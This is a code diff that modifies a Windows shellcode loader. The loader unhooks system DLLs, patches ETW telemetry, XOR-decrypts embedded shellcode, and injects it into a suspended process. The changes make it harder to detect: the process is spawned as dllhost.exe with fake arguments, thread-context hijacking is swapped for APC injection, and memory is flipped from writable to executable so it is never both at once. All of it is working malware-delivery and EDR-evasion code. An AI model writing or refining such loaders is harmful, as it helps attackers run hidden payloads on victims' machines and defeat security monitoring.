@@ -3,8 +3,8 @@
 // 1. DLL UNHOOKING        -> reload .text of ntdll/kernel32/kernelbase/advapi32
 // 2. TELEMETRY BYPASSES   -> ETW (EtwEventWrite = ret) ; AMSI commented out
 // 3. SHELLCODE DECRYPTION -> multi-byte XOR, chunked
-// 4. PROCESS CREATION     -> suspended svchost.exe
-// 5. INJECTION            -> thread context hijacking (RIP/RAX)
+// 4. PROCESS CREATION     -> suspended dllhost.exe (plausible args)
+// 5. INJECTION            -> APC queue + RW->RX (no RWX, no context hijack)
 //
 // ============ END LOADER ============
 
@@ -98,7 +98,6 @@ static void unhookModule(const wchar_t* moduleName)
 }
 
 // 2. TELEMETRY BYPASSES
-
 static void bypassEtw()
 {
     HMODULE ntdll = GetModuleHandleA("ntdll.dll");
@@ -108,9 +107,11 @@ static void bypassEtw()
     if (!target) return;
 
     DWORD oldProt = 0;
-    VirtualProtect(target, 1, PAGE_EXECUTE_READWRITE, &oldProt);
-    *(BYTE*)target = 0xC3;              // ret
-    VirtualProtect(target, 1, oldProt, &oldProt);
+    VirtualProtect(target, 8, PAGE_EXECUTE_READWRITE, &oldProt);
+    // xor eax,eax ; ret  -> return STATUS_SUCCESS (0)
+    BYTE patch[] = { 0x33, 0xC0, 0xC3 };
+    memcpy(target, patch, sizeof(patch));
+    VirtualProtect(target, 8, oldProt, &oldProt);
 }
 
 // Enable by uncommenting the call in main()
@@ -132,10 +133,11 @@ static void bypassAmsi()
 
 
 // 3. XOR DECRYPTION (chunked)
-
 static void xorDecryptChunked(unsigned char* buf, SIZE_T len,
                                 const unsigned char* key, SIZE_T keyLen)
 {
+    srand((unsigned)GetTickCount64());
+
     for (SIZE_T off = 0; off < len; off += CHUNK_SIZE) {
         SIZE_T n = (len - off < CHUNK_SIZE) ? (len - off) : CHUNK_SIZE;
         for (SIZE_T i = 0; i < n; i++)
@@ -145,6 +147,7 @@ static void xorDecryptChunked(unsigned char* buf, SIZE_T len,
             Sleep(30 + (DWORD)(rand() % 20)); // 30–50 ms                       // let the chunk settle
     }
 }
+
 
 // Main
 
@@ -163,45 +166,52 @@ int main()
     // --- 3. Decryption ---
     xorDecryptChunked(g_shellcode, g_shellcode_len, g_xor_key, g_xor_key_len);
 
-    // --- 4. Process creation (suspended svchost) ---
+    // --- 4. Process creation (suspended dllhost) ---
     wchar_t sysdir[MAX_PATH] = {};
     GetSystemDirectoryW(sysdir, MAX_PATH);
 
-    wchar_t target[MAX_PATH] = {};
-    _snwprintf_s(target, MAX_PATH, _TRUNCATE, L"%s\\svchost.exe", sysdir);
+    // lpApplicationName separeted : can add args without breaking path 
+    wchar_t appPath[MAX_PATH] = {};
+    _snwprintf_s(appPath, MAX_PATH, _TRUNCATE, L"%s\\dllhost.exe", sysdir);
+
+    // mutable command lign (CreateProcessW can write it)
+    wchar_t cmdline[MAX_PATH + 64] = {};
+    _snwprintf_s(cmdline, MAX_PATH + 64, _TRUNCATE,
+                 L"\"%s\" /Processid:{%08x-0000-0000-0000-000000000000}",
+                 appPath, GetCurrentProcessId());
 
     STARTUPINFOW si = {};
     si.cb = sizeof(si);
     PROCESS_INFORMATION pi = {};
 
-    if (!CreateProcessW(NULL, target, NULL, NULL, FALSE,
+    if (!CreateProcessW(appPath, cmdline, NULL, NULL, FALSE,
                         CREATE_SUSPENDED, NULL, NULL, &si, &pi))
         return 1;
 
-    // --- 5. Injection via thread context hijacking ---
+    // --- 5. Injection via APC, RW -> RX (no RWX, no context hijacking) ---
     LPVOID remote = VirtualAllocEx(pi.hProcess, NULL, g_shellcode_len,
                                    MEM_COMMIT | MEM_RESERVE,
-                                   PAGE_EXECUTE_READWRITE);
+                                   PAGE_READWRITE);          // RW d'abord
     if (!remote) {
         TerminateProcess(pi.hProcess, 1);
         return 1;
     }
 
-    // Écrire le shellcode en mémoire distante
     if (!WriteProcessMemory(pi.hProcess, remote, g_shellcode, g_shellcode_len, NULL)) {
         TerminateProcess(pi.hProcess, 1);
         return 1;
     }
 
-    
-    CONTEXT ctx = {};
-    ctx.ContextFlags = CONTEXT_FULL;
-    GetThreadContext(pi.hThread, &ctx);
+    // Switch in RX : page begin executable but not inscriptible
+    DWORD oldProt = 0;
+    if (!VirtualProtectEx(pi.hProcess, remote, g_shellcode_len,
+                          PAGE_EXECUTE_READ, &oldProt)) {
+        TerminateProcess(pi.hProcess, 1);
+        return 1;
+    }
 
-    ctx.Rip = (DWORD64)remote;   // Windows x64
-    ctx.Rax = (DWORD64)remote;   
-
-    SetThreadContext(pi.hThread, &ctx);
+    // APC on principal thread
+    QueueUserAPC((PAPCFUNC)remote, pi.hThread, 0);
     ResumeThread(pi.hThread);
 
     // --- 6. Monitoring ---
@@ -216,7 +226,7 @@ int main()
         }
         else
         {
-            wprintf(L"[-] Process <svchost.exe> encountered an external error (code %lu), go to eventvwr.msc\n", exitCode);
+            wprintf(L"[-] Process <dllhost.exe> encountered an external error (code %lu), go to eventvwr.msc\n", exitCode);
             Sleep(4000);
             break;
         }
